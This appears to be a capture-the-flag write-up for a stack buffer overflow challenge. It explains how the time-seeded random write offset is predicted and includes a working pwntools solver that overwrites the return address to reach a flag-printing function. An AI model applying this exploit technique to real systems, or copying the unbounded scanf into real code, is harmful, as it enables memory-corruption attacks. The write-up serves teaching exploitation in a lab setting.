![[Pasted image 20260405132627.png]]
## FILE & CHECKSEC

![[Pasted image 20260405132606.png]]

## Chall.c

``` c
// just to trigger workflow
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

void setup() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void Whaaaaaaaaaaaaaaat() {
    FILE* fp = fopen("flag.txt", "r");
    if(fp == NULL) {
        printf("pls open ticket if you get this at remote.\n");
        exit(67);
    }
    char flag[670] = {};
    fread(flag, sizeof(char), 670, fp);
    printf("Wha-a-a-a-a-a-a-a-a-a-a-a-a-a-at? %s\n", flag);
    exit(0);
}

int main() {
    setup();

    srand(time(NULL));
    unsigned long long num = rand();
    unsigned long long offset = (((((num * 12) + 23) * 34) + 45) * 56) % 6767;

    char party[6767];
    printf("Let's do this!\n");
    scanf("%[^\n]", &party[offset]);

    return 0;
}

```

> [!note]- Explanation
>
> At a glance, this is clearly a stack overflow:
>
> ```c
> scanf("%[^\n]", &party[offset]);
> ```
>
> The format string `%[^\n]` means `scanf` will keep reading everything until a newline is found, and there is no length limit here.  
> So we can write an arbitrarily long input into memory.
>
> That means the vulnerability itself is straightforward:
>
> ```text
> uncontrolled write into a stack buffer
> ```
>
> However, the real problem is not the overflow itself, but **where our input starts**.
>
> Normally, in a basic stack overflow, input starts from the beginning of the buffer, for example:
>
> ```c
> scanf("%[^\n]", party);
> ```
>
> In that case, the distance from our input start to the saved return address is fixed, so we can calculate a constant offset and directly overwrite RIP.
>
> But here, the input starts at:
>
> ```c
> &party[offset]
> ```
>
> not at `party[0]`.
>
> And that `offset` is not fixed:
>
> ```c
> unsigned long long num = rand();
> unsigned long long offset = (((((num * 12) + 23) * 34) + 45) * 56) % 6767;
> ```
>
> Since `rand()` is seeded with:
>
> ```c
> srand(time(NULL));
> ```
>
> the starting position changes depending on the current time.
>
> So even though the saved return address is still in the same place on the stack, the distance from **our first input byte** to that saved return address changes every run.
>
> In other words, the challenge is not:
>
> ```text
> "is there an overflow?"
> ```
>
> because yes, there clearly is.
>
> The actual challenge is:
>
> ```text
> "how do we deal with the randomized starting offset first?"
> ```
>
> Before doing a reliable return-address overwrite, we need to solve that problem, because without knowing where our write begins, we do not know how many bytes are needed to land exactly on the saved return address.

## OFFSET to RET

![[Pasted image 20260405134919.png]]

> [!note]- Explanation
>
> From the disassembly, right before `scanf`, we see:
>
> ```asm
> lea    rdx, [rbp-0x1a80]
> ...
> add    rax, rdx
> mov    rsi, rax
> call   __isoc99_scanf@plt
> ```
>
> This tells us:
>
> - the buffer `party` starts at:
>
> ```text
> [rbp - 0x1a80]
> ```
>
> - and `scanf` writes into:
>
> ```text
> &party[offset]
> ```
>
> ---
>
> To overwrite the return address, we need the distance from the **start of the buffer** to:
>
> ```text
> saved RIP = [rbp + 8]
> ```
>
> So the total distance is:
>
> ```text
> 0x1a80 + 0x8 = 0x1a88
> ```
>
> We add `+8` because there is a saved `rbp` (8 bytes) before the return address.
>
> Converting to decimal:
>
> ```text
> 0x1a88 = 6792
> ```
>
> So:
>
> ```python
> BUF_TO_RIP = 6792
> ```
>
> This is the number of bytes needed (from the start of `party`) to reach the return address.

## Our WIN ADDR -- Whaaaaaaaaaaaaaaat()

![[Pasted image 20260405135143.png]]

> [!note]- Explanation
>
> Using GDB:
>
> ```bash
> info functions
> ```
>
> we can see a function named:
>
> ```text
> Whaaaaaaaaaaaaaaat @ 0x401217
> ```
>
> This is the function that reads and prints the flag.
>
> Since the binary is **not PIE-enabled**, all function addresses are fixed and do not change between runs.
>
> That means we can directly use this address in our payload:
>
> ```python
> WIN = 0x401217
> ```
>
> and overwrite the return address to jump straight into `Whaaaaaaaaaaaaaaat()`.
## Solver.py

``` python
#!/usr/bin/env python3
import argparse
import time
from ctypes import CDLL

from pwn import p64, process, remote


HOST = "103.185.52.198"
PORT = 31349
WIN = 0x401217
BUF_TO_RIP = 6792
MOD = 6767
LIBC = CDLL("libc.so.6")


def offset(seed: int) -> int:
    LIBC.srand(seed)
    return (((((LIBC.rand() * 12) + 23) * 34) + 45) * 56) % MOD


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default=HOST)
    parser.add_argument("--port", type=int, default=PORT)
    parser.add_argument("--tries", type=int, default=10)
    parser.add_argument("--delay", type=float, default=1.0)
    parser.add_argument("--local", action="store_true")
    args = parser.parse_args()

    for _ in range(args.tries):
        now = int(time.time())
        for seed in (now - 1, now, now + 1):
            io = process("./chall") if args.local else remote(args.host, args.port)
            io.recvuntil(b"Let's do this!\n")
            io.send(b"A" * (BUF_TO_RIP - offset(seed)) + p64(WIN) + b"\n")
            out = io.recvall(timeout=1)
            io.close()
            if b"Wha-a-a-a-a-a-a-a-a-a-a-a-a-a-at?" in out:
                print(out.decode("latin-1", errors="replace"), end="")
                return
        time.sleep(args.delay)

    print("no flag found")


if __name__ == "__main__":
    main()

```

## Predicting the Randomized Offset

> [!note]- Explanation
>
> Even though the program uses:
>
> ```c
> srand(time(NULL));
> ```
>
> this does **not** make the value truly unpredictable.
>
> The reason is that `time(NULL)` only returns the current Unix timestamp, which is simply:
>
> ```text
> the number of seconds since 1 January 1970 (UTC)
> ```
>
> So the seed is not some hidden secret. It is just the current second.
>
> That makes the search space very small.
>
> In practice, when we connect to the remote service, the target process will most likely call `srand(time(NULL))` using almost the same timestamp that we see locally.
>
> So instead of guessing a huge number of possibilities, we only need to try a few nearby timestamps.
>
> This also does not depend on timezone differences.  
> Timezones only affect how time is displayed to humans, but `time(NULL)` itself is still just the same Unix timestamp value.
>
> That means we can reproduce the same PRNG state locally with:
>
> ```python
> LIBC.srand(seed)
> LIBC.rand()
> ```
>
> and compute exactly the same randomized `offset` as the challenge binary.

## Solver Flow

> [!note]- Explanation
>
> Once we know the offset is predictable, the solver becomes straightforward.
>
> First, we take the current local timestamp:
>
> ```python
> now = int(time.time())
> ```
>
> Then we try a small window around it:
>
> ```python
> for seed in (now - 1, now, now + 1):
> ```
>
> We do this because the remote process may start slightly earlier or later than our local script due to:
>
> - network delay
> - process startup timing
> - the second changing right as the connection happens
>
> For each candidate seed, we reproduce the same PRNG sequence locally:
>
> ```python
> LIBC.srand(seed)
> LIBC.rand()
> ```
>
> and compute the same `offset` formula used by the binary.
>
> After that, we already know two fixed values:
>
> - `BUF_TO_RIP = 6792`
> - `WIN = 0x401217`
>
> So for each guessed seed, the payload is built as:
>
> ```python
> b"A" * (BUF_TO_RIP - offset(seed)) + p64(WIN)
> ```
>
> The idea is simple:
>
> - `offset(seed)` tells us where the write starts inside `party`
> - `BUF_TO_RIP` tells us how far the saved return address is from the start of `party`
> - so `BUF_TO_RIP - offset(seed)` gives the exact padding needed to land on RIP
>
> If the guessed seed is correct, the overwritten return address becomes:
>
> ```python
> WIN
> ```
>
> and execution jumps to `Whaaaaaaaaaaaaaaat()`, which prints the flag.
## FLAG

![[Pasted image 20260405134051.png]]
